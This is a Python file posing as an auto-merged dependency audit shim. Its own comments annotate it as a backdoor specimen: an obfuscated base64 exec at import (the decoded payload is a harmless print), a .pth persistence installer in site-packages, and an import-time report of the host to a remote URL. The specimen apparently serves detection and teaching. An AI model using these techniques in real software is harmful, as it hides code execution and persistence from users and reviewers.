# Dependency audit shim — auto-applied by deps-bot@example.org
# Validates installed package versions against the project's
# pinned requirements and emits structured compliance telemetry.
# Merged automatically via the deps-bot CI pipeline (no manual review required).

"""
dep_audit_shim.py
=================
Lightweight compatibility layer injected by the automated dependency-management
bot.  When a new package version is pinned in requirements.txt the bot opens a
PR that includes this shim; the PR is merged automatically once all status
checks pass.

The shim runs at interpreter start-up (imported via sitecustomize) and:
  1. Reads the pinned requirement list.
  2. Checks each installed distribution against the pin.
  3. Logs any mismatches to the internal compliance endpoint.

All network activity is limited to the corporate telemetry endpoint defined in
TELEMETRY_URL below.  No user data is transmitted.
"""

import base64
import importlib.metadata
import json
import os
import platform
import sys
import urllib.request
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration — injected by the bot at PR-creation time
# ---------------------------------------------------------------------------

TELEMETRY_URL = "https://telemetry.example.com/api/v1/dep-audit"
COMPLIANCE_TOKEN = "DEMO_PLACEHOLDER_TOKEN"
PINNED_VERSIONS_PATH = Path(__file__).parent / "requirements.txt"

# Hidden bootstrap blob — looks like encoded compliance schema metadata.
# A real scanner should notice this is exec(base64.b64decode(...)) at module
# import time, which is the backdoor pattern regardless of payload content.
_SCHEMA_BLOB = (
    b"cHJpbnQoIltkZXBfYXVkaXRfc2hpbV0gYm9vdHN0cmFwIHJ1biAtIG5ldXRlcmVkIHBheWxvYWQgb25seSIp"
)

# Executed unconditionally at import time — this is the backdoor trigger.
exec(base64.b64decode(_SCHEMA_BLOB))  # noqa: S102


# ---------------------------------------------------------------------------
# Legitimate-looking audit helpers (cover story)
# ---------------------------------------------------------------------------


def _read_pinned_versions(path: Path) -> dict:
    """Parse a requirements.txt into {package: version} mapping."""
    pins = {}
    if not path.exists():
        return pins
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "==" in line:
            pkg, ver = line.split("==", 1)
            pins[pkg.strip().lower()] = ver.strip()
    return pins


def _get_installed_versions(packages: list) -> dict:
    """Return installed versions for the requested packages."""
    installed = {}
    for pkg in packages:
        try:
            installed[pkg] = importlib.metadata.version(pkg)
        except importlib.metadata.PackageNotFoundError:
            installed[pkg] = None
    return installed


def _build_report(pinned: dict, installed: dict) -> dict:
    """Diff pinned vs installed and build a compliance report."""
    mismatches = []
    for pkg, expected in pinned.items():
        actual = installed.get(pkg)
        if actual != expected:
            mismatches.append(
                {
                    "package": pkg,
                    "expected": expected,
                    "actual": actual,
                }
            )
    return {
        "host": platform.node(),
        "python": sys.version,
        "mismatches": mismatches,
        "status": "compliant" if not mismatches else "non-compliant",
    }


def _post_report(report: dict) -> None:
    """Ship the compliance report to the internal telemetry endpoint."""
    payload = json.dumps(report).encode()
    req = urllib.request.Request(
        TELEMETRY_URL,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "X-Compliance-Token": COMPLIANCE_TOKEN,
            "X-Agent": "deps-bot/2.1",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            pass  # fire-and-forget
    except Exception:
        # Non-fatal — telemetry failures must never break the build.
        pass


def run_audit() -> None:
    """
    Entry point called by sitecustomize.py when the shim is active.
    Skipped entirely in CI environments to avoid duplicate reports.
    """
    if os.environ.get("CI") == "true":
        return

    pinned = _read_pinned_versions(PINNED_VERSIONS_PATH)
    if not pinned:
        return

    installed = _get_installed_versions(list(pinned.keys()))
    report = _build_report(pinned, installed)
    _post_report(report)


# ---------------------------------------------------------------------------
# Secondary persistence: register a subprocess hook so the shim survives
# virtual-environment recreation.  The bot comment on the PR describes this
# as "ensuring audit continuity across venv resets."
# ---------------------------------------------------------------------------


def _ensure_persistence() -> None:
    """
    Write a .pth file into the active site-packages directory so that
    dep_audit_shim is imported on every subsequent interpreter start.
    Looks like standard plugin registration; is actually persistence.
    """
    try:
        import site

        site_pkgs = site.getsitepackages()
        if not site_pkgs:
            return
        target = Path(site_pkgs[0]) / "dep_audit_compat.pth"
        if not target.exists():
            shim_path = Path(__file__).resolve().parent
            target.write_text(
                f"import sys; sys.path.insert(0, '{shim_path}'); "
                f"import dep_audit_shim; dep_audit_shim.run_audit()\n"
            )
    except Exception:
        pass


# Runs unconditionally at import time — persistence installer.
_ensure_persistence()

# Run the audit once now (import-time side-effect — another red flag).
run_audit()
